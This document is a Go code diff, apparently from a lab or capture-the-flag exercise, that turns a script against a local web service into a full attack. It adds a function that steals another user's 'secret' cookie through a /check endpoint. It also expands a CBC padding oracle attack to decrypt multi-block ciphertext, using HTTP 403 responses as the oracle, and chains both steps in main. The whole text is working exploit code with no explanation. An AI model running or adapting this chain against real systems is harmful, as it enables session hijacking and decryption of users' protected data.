@@ -9,6 +9,7 @@ import (
 	"io/ioutil"
 	"math/rand"
 	"net/http"
+	"strings"
 	"sync"
 )
 
@@ -72,6 +73,27 @@ func addNewUser(wg *sync.WaitGroup, password string) []byte {
 	return res
 }
 
+func stealCookie(secret string, cookieUserId, desiredCookieId uint) string {
+	req, err := http.NewRequest("GET", fmt.Sprintf("http://localhost:8080/check?userid=%v&password=kekeke", desiredCookieId), nil)
+	if err != nil {
+		panic(err)
+	}
+	req.AddCookie(&http.Cookie{Name: "secret", Value: secret})
+	req.AddCookie(&http.Cookie{Name: "uid", Value: fmt.Sprint(cookieUserId)})
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		panic(err)
+	}
+	for _, cookie := range resp.Cookies() {
+		if cookie.Name == "secret" {
+			fmt.Println("Cookie was stolen: ", cookie.Value)
+			return cookie.Value
+		}
+	}
+	panic("!")
+}
+
 func tryDecr(userId uint, encrypted []byte) bool {
 	secretB64 := base64.StdEncoding.EncodeToString(encrypted)
 	req, err := http.NewRequest("GET", "http://localhost:8080/task_info/4", nil)
@@ -88,9 +110,16 @@ func tryDecr(userId uint, encrypted []byte) bool {
 	return resp.StatusCode == 403
 }
 
-func paddingOrcaleAttack(userId uint, encrypted1 []byte) string {
-	encrypted := append(cbc.InitVector, encrypted1[:16]...)
-	encryptedCopy := append(cbc.InitVector, encrypted1[:16]...)
+func paddingOracleAttackBlock(userId uint, leftBlock, rightBlock []byte) string {
+	count := 0
+
+	encrypted := make([]byte, len(leftBlock) + len(rightBlock))
+	encryptedCopy := make([]byte, len(leftBlock) + len(rightBlock))
+	copy(encrypted[:16], leftBlock)
+	copy(encrypted[16:], rightBlock)
+	copy(encryptedCopy[:16], leftBlock)
+	copy(encryptedCopy[16:], rightBlock)
+
 	result := make([]byte, 16)
 	i2 := make([]byte, 16)
 	for k := 1; k < 17; k++ {
@@ -102,40 +131,48 @@ func paddingOrcaleAttack(userId uint, encrypted1 []byte) string {
 				panic(err1)
 			}
 			encrypted[16 - k] = byte(i)
+			count++
 			if tryDecr(userId, encrypted) {
 				i2[16 - k] = byte(i) ^ byte(k)
 				result[16 - k] = i2[16 - k] ^ encryptedCopy[16 - k]
+				break
 			}
 		}
+	}
+	if result[len(result)-1] > 0 && result[len(result)-1] < 16 {
+		return string(result[:16-result[len(result)-1]])
 	}
 	return string(result)
 }
 
-func examplePOA() {
-	secret, err := base64.StdEncoding.DecodeString("WldaJgo+J7USZwEQBHjyKA==")
+func paddingOracleAttack(secret string, userId uint) string {
+	fullSecret, err := base64.StdEncoding.DecodeString(secret)
+	if len(fullSecret)%16 != 0 {
+		panic("!")
+	}
+	blocksCount := len(fullSecret) / 16
+	fmt.Println("Blocks count: ", blocksCount)
+	fmt.Print("Getting blocks... 1 ")
 	if err != nil {
 		panic(err)
 	}
-	fmt.Println(paddingOrcaleAttack(3, secret))
+	var result strings.Builder
+	result.WriteString(paddingOracleAttackBlock(userId, cbc.InitVector, fullSecret[:16]))
+
+	for i := 1; i < blocksCount; i++ {
+		fmt.Print(i + 1, " ")
+		result.WriteString(paddingOracleAttackBlock(userId, fullSecret[i*16-16:i*16], fullSecret[i*16:i*16+16]))
+	}
+	fmt.Println("ok!")
+	return result.String()
 }
 
-func exampleCookieLeaking() {
-	secret := "XwcPJnI7IBJyYo4WZH2S3Q=="
-	userId := 4
-	req, err := http.NewRequest("GET", "http://localhost:8080/check?userid=1&password=kekeke", nil)
-	if err != nil {
-		panic(err)
-	}
-	req.AddCookie(&http.Cookie{Name: "secret", Value: secret})
-	req.AddCookie(&http.Cookie{Name: "uid", Value: fmt.Sprint(userId)})
-	client := &http.Client{}
-	resp, err := client.Do(req)
-	if err != nil {
-		panic(err)
-	}
-	fmt.Println(resp)
+func examplePOA(secret string, cookieUserId, desiredUserId uint) {
+	realSecret := stealCookie(secret, cookieUserId, desiredUserId)
+	plainSecret := paddingOracleAttack(realSecret, desiredUserId)
+	fmt.Printf("Plain secret: '%v'\n", plainSecret)
 }
 
 func main() {
-
+	examplePOA("L7IgQG/tU2Fn0iKVZ9EneA==", 1, 0)
 }
